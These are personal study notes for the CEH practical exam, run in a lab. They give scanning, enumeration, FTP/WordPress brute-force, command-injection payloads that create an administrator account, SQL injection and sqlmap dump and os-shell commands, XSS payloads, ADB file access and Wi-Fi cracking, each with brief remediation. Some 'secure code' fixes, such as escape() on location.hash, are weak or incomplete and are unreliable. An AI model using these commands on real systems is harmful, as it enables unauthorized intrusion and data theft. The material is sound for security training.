My CEH Practical Notes
This guide is for acing the CEH practical exam and keeping me sharp on my cybersecurity job. It’s got every command and step I need, with all the detailed comments and instructions from my notes, exactly as I wrote them, just with typos and grammar fixed. I’m keeping it super informal so I can follow it fast. Collapsible sections make it clean: whole steps like "Scanning Networks" collapse, and tools like Nmap or OWASP ZAP get their own collapsible sections for their commands and notes. Everything’s in code blocks for copying. Run sudo su to be root for commands that need it.

Note: Gotta be root for most of these, so sudo su first.

Scanning Networks (always do sudo su)

Note: This whole section collapses to hide all scanning steps. Expand to see tools like Nmap.

Nmap Commands
1- Nmap scan for alive/active hosts command for 192.189.19.18- or any ip you want to scan:
# Scans the whole subnet for active hosts, aggressive mode
nmap -A 192.189.19.0/24
# or faster scan for one IP
nmap -T4 -A <ip>

2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command:
# Full TCP connect scan, verbose output
nmap -sT -v <ip>

3- Nmap scan if firewall/IDS is opened, half scan-:
# SYN stealth scan, verbose
nmap -sS -v <ip>


If even this the above command is not working then use this command:

# Fragmented packets to bypass some firewalls
nmap -f <ip>

4- -A command is aggressive scan it includes- OS detection (-O), Version (-sV), Script (-sC) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for host discovery or OS-:
# OS detection with port scan
nmap -O <ip>
# or you can use aggressive scan
nmap -A <ip>

7- If host is windows then use this command-:
# this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139)
nmap --script smb-os-discovery.nse <ip>

8- nmap command for source port manipulation, in this port is given or we use common port-:
# Scan using source port 80 to bypass some filters
nmap -g 80 <ip>

Remediation:

Close unused ports.
Use firewalls to block scans.
Monitor traffic with IDS.
Patch services found by -sV.

Enumeration

Note: This section collapses to hide enumeration steps. Expand to see tools like Nmap, enum4linux.

Enumeration Tools
Nmap for NetBIOS and SNMP
1- NetBios enum using windows- in cmd type:
# displays NEtBIOS name table
nbtstat -a <ip>

2- NetBios enum using nmap-:
# Service and NetBIOS script, verbose
nmap -sV -v --script nbstat.nse <ip>

3- SNMP enum using nmap- (-p 161 is port for SNMP)--> Check if port is open:
# Check if SNMP port 161 is open
nmap -sU -p 161 <ip>
# It will show user accounts, processes etc --> for parrot
snmp-check <ip>

Other Enumeration Tools
4- DNS recon/enum-:
# Check DNS records, try zone transfer
dnsrecon -d <domain> -z

5- FTP enum using nmap-:
# Aggressive scan on FTP port 21
nmap -p 21 -A <ip>

6- NetBios enum using enum4linux-:
# all info
enum4linux -u <username> -p <password> -n <ip>
# policy info
enum4linux -u <username> -p <password> -P <ip>

Remediation:

Disable NetBIOS and SMB if not needed.
Restrict ports 161 (SNMP), 21 (FTP), 445/139 (SMB).
Use strong passwords.
Secure DNS to prevent zone transfers.

Quick Overview (Steganography) --> Snow, Openstego

Note: This section collapses to hide steganography steps. Expand to see Snow and OpenStego.

Steganography Tools
Snow
1- Hide Data Using Whitespace Steganography- (magic is password and your secret is stored in readme2.txt along with the content of readme.txt):
# Hide message in readme2.txt, magic is password
snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt

2- To Display Hidden Data- (then it will show the content of readme2.txt content):
# Show hidden message in readme2.txt
snow -C -p "magic" readme2.txt

OpenStego
3- Image Stegnography using Openstego-:

Install OpenStego:

# Install on Parrot OS
sudo apt install openstego


Hide data:

# Embed secret.txt in cover.png, output to output.png
openstego embed -mf secret.txt -cf cover.png -p <password> -sf output.png


Extract data:

# Extract from output.png to output_dir
openstego extract -sf output.png -p <password> -xd output_dir

Remediation:

Scan files for hidden data.
Use file integrity checks.
Restrict unverified file uploads.

Sniffing

Note: This section collapses to hide sniffing steps. Expand to see Wireshark.

Wireshark Commands
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section:
# Show POST requests
http.request.method==POST


Alternative: Go to Tools > Credentials to see passwords.

2- Network Analysis for DoS or Machine Count-:

Filters:

# Count machines
tcp.flags.syn == 1 and tcp.flags.ack == 0
# Find DoS source
tcp.flags.syn == 1


Steps: Go to Statistics > IPv4 Addresses > Source and Destination, then apply filter.

Remediation:

Use HTTPS for all web traffic.
Encrypt sensitive data.
Deploy IDS to detect DoS.
Rate-limit traffic.

Hacking Web Servers

Note: This section collapses to hide web server hacking steps. Expand to see Netcat, Telnet, Nmap, Hydra.

Web Server Tools
Netcat and Telnet
1- Footprinting web server Using Netcat and Telnet-:
# Netcat to get server banner
nc -vv <domain> 80
GET / HTTP/1.0
# or Telnet
telnet <domain> 80
GET / HTTP/1.0

Nmap
2- Enumerate web server info (Nmap)-:
# Get service info and enumerate web server
nmap -sV --script=http-enum <domain>

Hydra
3- Crack FTP credentials-:
# Check if FTP port 21 is open
nmap -p 21 <ip>
# To see if it is directly connecting or needing credentials
ftp <ip>
# Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file
# Now in terminal type
hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://<ip>
# or single user
hydra -l <username> -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://<ip>

Remediation:

Hide server banners.
Disable anonymous FTP.
Use strong passwords and account lockout.
Patch web server software.

Hacking Web Applications

Note: This section collapses to hide web app hacking steps. Expand to see OWASP ZAP, Gobuster, WPScan, Metasploit, XSS.

Web App Tools
OWASP ZAP
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it will open. In target tab put the url and click automated scan:
# Open ZAP GUI
zaproxy

Gobuster
2- Directory Bruteforcing-:
# Find hidden directories
gobuster dir -u <ip> -w /home/attacker/Desktop/common.txt

WPScan and Metasploit
3- Enumerate a Web Application using WPscan & Metasploit-:
# Find WordPress users (u means username)
wpscan --url http://<ip>:8080/NEW --enumerate u


Then type msfconsole to open metasploit. Type:

# Open Metasploit
msfconsole
# Use WordPress login scanner
use auxiliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
set RHOSTS <ip>
set RPORT 8080
set TARGETURI http://<ip>:8080/
set USERNAME <username>
run

4- Brute Force using WPscan- (Use this only after enumerating the user like in step 3):
# Brute-force after finding username
wpscan --url http://<ip>:8080/NEW -u <username> -P /home/attacker/Desktop/Wordlist/password.txt
# or with user and password lists
wpscan --url http://<ip>:8080/NEW --usernames /home/attacker/Desktop/Wordlist/usernames.txt --passwords /home/attacker/Desktop/Wordlist/password.txt

Command Injection
5- Command Injection-:
# Find users
| net user
# directory listing
| dir C:\
# Add a user
| net user Test /add
# Check a user
| net user Test
# To convert the test account to admin
| net localgroup Administrators Test /add
# Once again check to see if it has become administrator
| net user Test


Now you can do a RDP connection with the given ip and the Test account which you created.

Reflected XSS Testing
6- Reflected XSS Testing-:

Test 1: Basic XSS:
Payload:



<script>alert('XSS')</script>


Steps: Put payload in search field or URL (e.g., ?q=<payload>). If alert pops, it’s vulnerable.
Insecure Code:

<?php echo $_GET['q']; ?>


Secure Code:

<?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?>


Test 2: XSS in JSON:
Payload:



"><script>alert('XSS')</script>


Steps: Use Burp Suite to intercept API request, inject payload in parameter (e.g., search=<payload>), check if response runs script.
Insecure Code:

res.json({ result: req.query.search });


Secure Code:

res.json({ result: sanitize(req.query.search) });


Test 3: XSS in URL Fragments:
Payload:



#<script>alert('XSS')</script>


Steps: Add to URL (e.g., http://<domain>/page#<payload>), check for alert.
Insecure Code:

document.write(location.hash);


Secure Code:

document.write(escape(location.hash));

Remediation:

Sanitize all inputs.
Use Content Security Policy (CSP).
Escape outputs (HTML, JSON, JS).
Update WordPress and plugins.
Restrict directory access.
Disable command execution.

SQL Injections

Note: This section collapses to hide SQL injection steps. Expand to see SQLMap.

SQLMap Commands
1- Auth Bypass-:
# Bypass login
hi' OR 1=1 --

2- Insert new details if sql injection found in login page in username tab enter-:
# Add new user
blah';insert into login values('john','apple123');--

3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write:
# Get cookies
document.cookie


Then copy the cookie value that was presented after this command. Then go to terminal and type this command:

# Find databases
sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" --dbs

4- Command to check tables of database retrieved-:
# List tables
sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" -D <database> --tables

5- Select the table you want to dump- (Get username and password):
# Dump table data
sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" -D <database> -T <table> --dump

6- For OS shell this is the command-:
# Get shell
sqlmap -u "http://<domain>/profile.aspx?id=1" --cookie="<cookie_value>" --os-shell


In the shell type:

# to view the tasks
TASKLIST
# for windows to get all os version
systeminfo
# for linux to get os version
uname -a

Remediation:

Use parameterized queries.
Escape inputs.
Limit database user permissions.
Use a WAF.

Android

Note: This section collapses to hide Android hacking steps. Expand to see Nmap and ADB.

Android Tools
Nmap and ADB
1- Scan for ADB port-:
# Check port 5555
nmap -sV -p 5555 <ip>

2- Connect to ADB- (Connect adb with parrot):
# Connect to device
adb connect <ip>:5555

3- Access mobile device on parrot-:
# Access mobile device on parrot
adb shell
# check current directory
pwd
# list files
ls
# go to sdcard
cd sdcard
ls
# read file
cat secret.txt
# If you can't find it there then go to Downloads folder
cd downloads
ls

Remediation:

Disable ADB and USB debugging.
Restrict network access to port 5555.

Wireshark

Note: This section collapses to hide Wireshark steps. Expand to see filters.

Wireshark Filters
1- Filters for analysis-:
# How many machines
tcp.flags.syn == 1 and tcp.flags.ack == 0
# Which machine for dos
tcp.flags.syn == 1
# for passwords
http.request.method == POST


Alternative: click Tools > Credentials for passwords.
For machine count: Go to Statistics > IPv4 Addresses > Source and Destination, then apply filter.

Remediation:

Enforce HTTPS.
Use IDS for DoS detection.
Encrypt credentials.

Find FQDN

Note: This section collapses to hide FQDN steps. Expand to see Nmap.

Nmap for FQDN
1- Nmap for LDAP (port 389)- (Find the FQDN in a subnet/network):
# Scan subnet for LDAP
nmap -p389 -sV -iL <target_list>
# or single IP
nmap -p389 -sV <ip>

Remediation:

Restrict LDAP port 389.
Use secure LDAP authentication.

Cracking Wi-Fi Networks

Note: This section collapses to hide Wi-Fi cracking steps. Expand to see Aircrack-ng.

Aircrack-ng Commands
1- Cracking Wifi Password-:
# For cracking WEP network
aircrack-ng <pcap_file>
# For cracking WPA2 or other networks through the captured .pcap file
aircrack-ng -a2 -b <target_bssid> -w /home/attacker/Desktop/Wordlist/password.txt <wpa2_pcap_file>

Remediation:

Use WPA3 or strong WPA2 passwords.
Enable MAC filtering.
Disable WEP.

Some Extra Work

Note: This section collapses to hide extra checks. Expand to see Nmap.

Nmap Checks
1- Check RDP enabled after getting ip-:
# ip.txt contains all the alive hosts from target subnet
nmap -p 3389 -iL ip.txt | grep open

2- Check MySQL service running-:
# ip.txt contains all the alive hosts from target subnet
nmap -p 3306 -iL ip.txt | grep open

Remediation:

Disable RDP and MySQL if unused.
Restrict access to ports 3389, 3306.
Use strong credentials.

Remediation Summary

Network: Block unused ports, use firewalls, monitor with IDS.
Web Apps: Sanitize inputs, use CSP, escape outputs, update software.
Database: Parameterized queries, limit permissions.
Wi-Fi: Strong passwords, WPA3, MAC filtering.
General: Patch systems, use complex passwords, regular pentests.

Last updated: April 2025
